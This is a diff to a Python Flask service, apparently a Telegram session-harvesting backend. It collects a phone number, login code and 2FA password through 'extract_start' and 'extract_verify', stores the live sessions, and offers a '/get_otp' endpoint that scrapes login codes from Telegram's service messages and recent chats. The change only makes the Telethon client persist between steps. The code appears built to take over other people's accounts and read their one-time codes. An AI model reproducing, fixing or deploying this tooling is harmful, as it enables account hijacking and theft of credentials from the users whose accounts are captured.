@@ -1,9 +1,9 @@
 """
 ==============================================
-SESSION API v4 — Simple & Reliable
+SESSION API v5 — Persistent Client Fix
 ==============================================
-No persistent loops. Each request is independent.
-Session state saved as string between requests.
+Keeps Telethon clients alive between extract_start
+and extract_verify to prevent auth key loss.
 ==============================================
 """
 
@@ -26,28 +26,34 @@ PORT = int(os.environ.get("PORT", 5000))
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
 
-# Store pending logins (login_id -> {session_state, phone, hash})
+# Store pending logins (login_id -> {client, phone, hash, loop})
+# Client is kept ALIVE — not disconnected between start and verify
 pending_logins = {}
+
 # Store active sessions (session_hash -> {session_str, phone, name, ...})
 active_sessions = {}
 
 def get_hash(s):
     return hashlib.md5(s[:50].encode()).hexdigest()[:12]
 
+def get_or_create_loop():
+    """Get a persistent event loop running in a background thread."""
+    if not hasattr(get_or_create_loop, '_loop') or get_or_create_loop._loop.is_closed():
+        loop = asyncio.new_event_loop()
+        t = threading.Thread(target=loop.run_forever, daemon=True)
+        t.start()
+        get_or_create_loop._loop = loop
+    return get_or_create_loop._loop
+
 def run_async(coro):
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    try:
-        return loop.run_until_complete(coro)
-    finally:
-        loop.close()
+    loop = get_or_create_loop()
+    future = asyncio.run_coroutine_threadsafe(coro, loop)
+    return future.result(timeout=120)
 
 @app.route("/health", methods=["GET"])
 def health():
     return jsonify({"status": "ok", "active": len(active_sessions), "pending": len(pending_logins)})
 
-# =============================================
-# 1. EXTRACT START — Send Code
 # =============================================
 @app.route("/extract_start", methods=["POST"])
 def extract_start():
@@ -68,17 +74,14 @@ def extract_start():
             client = TelegramClient(StringSession(), API_ID, API_HASH)
             await client.connect()
             result = await client.send_code_request(phone)
-            # Save the session state BEFORE disconnecting
-            # This preserves the auth key needed for sign_in
-            saved_session = client.session.save()
-            await client.disconnect()
-            return saved_session, result.phone_code_hash
+            # DO NOT disconnect — keep client alive for verify step
+            return client, result.phone_code_hash
 
-        saved_session, phone_code_hash = run_async(do_send())
+        client, phone_code_hash = run_async(do_send())
 
-        # Store only strings — no live objects
+        # Store the LIVE client — this preserves the connection
         pending_logins[login_id] = {
-            "session_state": saved_session,
+            "client": client,
             "phone": phone,
             "phone_code_hash": phone_code_hash,
             "created_at": time.time()
@@ -88,7 +91,11 @@ def extract_start():
         def cleanup():
             time.sleep(300)
             if login_id in pending_logins:
-                del pending_logins[login_id]
+                entry = pending_logins.pop(login_id, None)
+                if entry and entry.get("client"):
+                    try:
+                        run_async(entry["client"].disconnect())
+                    except: pass
         threading.Thread(target=cleanup, daemon=True).start()
 
         return jsonify({"status": "ok", "login_id": login_id, "message": f"Code sent to {phone}"})
@@ -102,9 +109,6 @@ def extract_start():
             return jsonify({"status": "error", "message": "Too many attempts. Wait a few minutes."}), 429
         return jsonify({"status": "error", "message": msg}), 500
 
-# =============================================
-# 2. EXTRACT VERIFY — Complete Login
-# =============================================
 @app.route("/extract_verify", methods=["POST"])
 def extract_verify():
     try:
@@ -117,17 +121,17 @@ def extract_verify():
         password = data.get("password", "")
 
         if login_id not in pending_logins:
-            return jsonify({"status": "error", "message": "Login expired. Start again."}), 404
+            return jsonify({"status": "error", "message": "Login expired. Start again."}), 400
 
         login_data = pending_logins[login_id]
-        saved_session = login_data["session_state"]
+        client = login_data["client"]
         phone = login_data["phone"]
         phone_code_hash = login_data["phone_code_hash"]
 
         async def do_verify():
-            # Recreate client from saved session state
-            client = TelegramClient(StringSession(saved_session), API_ID, API_HASH)
-            await client.connect()
+            # Re-use the SAME client that sent the code
+            if not client.is_connected():
+                await client.connect()
 
             try:
                 await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
@@ -137,7 +141,7 @@ def extract_verify():
                     if password:
                         await client.sign_in(password=password)
                     else:
-                        await client.disconnect()
+                        # Don't disconnect — user will send 2FA password next
                         return "2FA_NEEDED"
                 else:
                     await client.disconnect()
@@ -156,8 +160,9 @@ def extract_verify():
 
         result = run_async(do_verify())
 
-        if login_id in pending_logins:
-            del pending_logins[login_id]
+        # Clean up on success (but NOT on 2FA — need client for next step)
+        if result != "2FA_NEEDED":
+            pending_logins.pop(login_id, None)
 
         if result == "2FA_NEEDED":
             return jsonify({"status": "2fa", "message": "Send the 2FA password too."})
@@ -173,15 +178,19 @@ def extract_verify():
     except Exception as e:
         msg = str(e)
         logging.error(f"extract_verify: {msg}")
+        # Clean up on error
+        if login_id in pending_logins:
+            entry = pending_logins.pop(login_id, None)
+            if entry and entry.get("client"):
+                try:
+                    run_async(entry["client"].disconnect())
+                except: pass
         if "PHONE_CODE_INVALID" in msg:
             return jsonify({"status": "error", "message": "Wrong code. Try again."}), 400
         if "PHONE_CODE_EXPIRED" in msg:
             return jsonify({"status": "error", "message": "Code expired. Start again."}), 400
         return jsonify({"status": "error", "message": msg}), 500
 
-# =============================================
-# 3. ACTIVATE SESSION
-# =============================================
 @app.route("/activate", methods=["POST"])
 def activate_session():
     try:
@@ -239,8 +248,6 @@ def activate_session():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 # =============================================
-# 4. GET OTP — Returns NEWEST code
-# =============================================
 @app.route("/get_otp", methods=["POST"])
 def get_otp():
     try:
@@ -260,7 +267,7 @@ def get_otp():
             await client.connect()
             otps = []
             now = time.time()
-            
+
             try:
                 # Priority 1: Check Telegram service messages (777000)
                 try:
@@ -273,7 +280,7 @@ def get_otp():
                                 for c in codes:
                                     otps.append({"code": c, "text": m.text[:100], "time": m.date.timestamp()})
                 except: pass
-                
+
                 # Priority 2: Check recent chats
                 if not otps:
                     try:
@@ -289,10 +296,10 @@ def get_otp():
                                                 otps.append({"code": c, "text": m.text[:100], "time": m.date.timestamp()})
                             except: pass
                     except: pass
-                    
+
             except: pass
             await client.disconnect()
-            
+
             # Sort by time — newest first
             otps.sort(key=lambda x: x["time"], reverse=True)
             return otps
@@ -311,8 +318,6 @@ def get_otp():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 # =============================================
-# 5. DISCONNECT
-# =============================================
 @app.route("/disconnect", methods=["POST"])
 def disconnect_session():
     try:
@@ -327,5 +332,5 @@ def disconnect_session():
         return jsonify({"status": "error"}), 500
 
 if __name__ == "__main__":
-    print("🚀 Session API v4")
+    print("🚀 Session API v5 — Persistent Client")
     app.run(host="0.0.0.0", port=PORT, debug=False)
